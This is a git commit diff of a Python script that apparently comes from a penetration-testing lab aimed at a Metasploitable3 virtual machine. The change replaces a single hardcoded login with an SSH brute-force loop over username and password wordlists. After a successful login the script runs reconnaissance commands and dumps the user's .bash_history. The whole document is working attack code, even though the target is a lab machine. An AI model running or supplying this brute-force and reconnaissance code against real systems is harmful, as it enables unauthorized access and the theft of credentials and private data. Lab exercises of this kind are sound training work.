66758ada76c0ff556387b8550ce317c95d31d8c2
Feras Alsinan <112576685+Feras532@users.noreply.github.com>
2025-04-14 21:20:54 +0300

    Update script.py

--- Phase1/script.py
+++ Phase1/script.py
@@ -1,46 +1,63 @@
 import paramiko
+import time
 
 hostname = "192.168.56.102"
-
 port = 22
-username="vagrant"
-password = "vagrant"
+
+# Read usernames and passwords from files
+with open("users.txt", "r") as f:
+    users = f.read().splitlines()
+
+with open("passwords.txt", "r") as f:
+    passwords = f.read().splitlines()
 
 client = paramiko.SSHClient()
 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-try:
-    print(f'Connecting to {hostname}')
-    client.connect(hostname, port=port, username=username, password=password)
 
-    print('The script worked and we are connected!!')
-    
-    print('printing whoami:')
+found = False
+
+for username in users:
+    for password in passwords:
+        print(f'Trying {username}:{password}')
+        try:
+            client.connect(hostname, port=port, username=username, password=password, timeout=5)
+            print('\n[+] Login success!')
+            print(f'[+] Cracked credentials: {username}:{password}')
+            found = True
+            break
+        except:
+            print('[-] Failed\n')
+            time.sleep(1)
+    if found:
+        break
+
+if found:
+    print('\n[+] printing whoami:')
     stdin, stdout, stderr = client.exec_command("whoami")
     print(stdout.read().decode().strip())
 
-    print('printing id:')
+    print('\n[+] printing id:')
     stdin, stdout, stderr = client.exec_command("id")
     print(stdout.read().decode().strip())
 
-    print('printing system info (uname -a):')
+    print('\n[+] printing uname -a:')
     stdin, stdout, stderr = client.exec_command("uname -a")
     print(stdout.read().decode().strip())
 
-    print('printing the hostname:')
+    print('\n[+] printing hostname:')
     stdin, stdout, stderr = client.exec_command("hostname")
     print(stdout.read().decode().strip())
-    
-    print('bash_history')
+
+    print('\n[+] printing .bash_history:')
     stdin, stdout, stderr = client.exec_command("cat /home/vagrant/.bash_history")
     print(stdout.read().decode().strip())
 
-    print('printing first 3 running processes:')
+    print('\n[+] printing first 3 processes:')
     stdin, stdout, stderr = client.exec_command("ps aux | head -3")
     print(stdout.read().decode().strip())
-    
-    print('Exploit we hacked the metasploitable3 successfully!')
-except Exception as e:
-    print('err:', e)
 
-finally:
-    client.close()
+    print('\n[✔] Exploit done. Metasploitable3 was accessed by brute-force!\n')
+else:
+    print('[x] Brute-force failed. No valid credentials found.')
+
+client.close()
